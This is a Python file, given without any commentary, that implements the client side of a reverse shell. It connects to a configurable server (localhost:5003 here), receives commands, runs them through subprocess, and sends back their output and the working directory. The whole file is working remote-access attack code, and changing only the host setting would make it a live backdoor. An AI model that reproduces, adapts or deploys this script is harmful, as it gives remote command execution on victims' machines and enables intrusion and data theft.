import socket
import os, sys
import subprocess

SERVER_HOST = 'localhost'
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

print(SERVER_HOST)
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
 
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()

    if command.lower() == "exit()":
        break

    if splited_command[0].lower() == 'cd':
        try:
            os.chdir(' '.join(splited_command[1:]))
        
        except FileNotFoundError as e:
            output = ''
    
    else:
        output = subprocess.getoutput(command)
    
    cwd = os.getcwd()

    message = f'{output}{SEPARATOR}{cwd}'
    s.send(message.encode())
s.close()